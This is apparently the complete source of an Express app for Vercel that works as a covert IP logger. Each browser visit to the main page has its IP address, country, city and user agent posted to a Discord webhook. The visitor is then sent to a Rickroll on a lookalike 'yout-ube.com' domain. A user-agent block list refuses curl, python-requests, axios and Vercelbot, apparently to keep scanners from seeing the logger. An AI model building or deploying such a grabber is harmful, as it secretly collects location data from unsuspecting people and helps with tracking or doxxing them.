// Libs
const express = require("express");
const userAgent = require("express-useragent");
const path = require("path");
const { WebhookClient } = require("discord.js");

// Setup and middleware
const webhookClient = new WebhookClient({ url: process.env.URL });
const app = express();
app.disable("x-powered-by")
app.use(userAgent.express());
app.use(express.static(path.join(__dirname, "./public",)))


// Decline requests from automated scripts
const secCheck = (browser) => {
    const noWayTheseGet200 = ["python-requests", "curl", "unknown", "axios","Vercelbot"];
    if (noWayTheseGet200.includes(browser)){
        return false;
    } else{
        return true;
    };
};

// Main page
app.get("/", (req, res) => {
    if (secCheck(req.useragent.browser)){
        let payload = {
            title: req.headers["x-forwarded-for"],
            color: 439191,
            fields: [
                {
                    name: "Country",
                    value: (req.headers["x-vercel-ip-country"]) ? req.headers["x-vercel-ip-country"] : "N/A"
                },
                {
                    name: "City",
                    value: (req.headers["x-vercel-ip-city"]) ? req.headers["x-vercel-ip-city"] : "N/A"
                },
                {
                    name: "User agent",
                    value: (req.useragent.source) ? req.useragent.source : "N/A"
                }
            ]
        };
        webhookClient.send({ embeds: [payload] }).then((response) => {
            res.redirect("https://www.yout-ube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley");
        }).catch((err) => {
            console.log(err);
            res.redirect("https://www.yout-ube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley");
        });
    } else{
        res.redirect("/no-access");
    };
});

// No access page
app.get("/no-access",(req,res) => {
    res.sendFile(path.join(__dirname, "./public", "no_access.html"));
});

// For vercel serverless
module.exports = app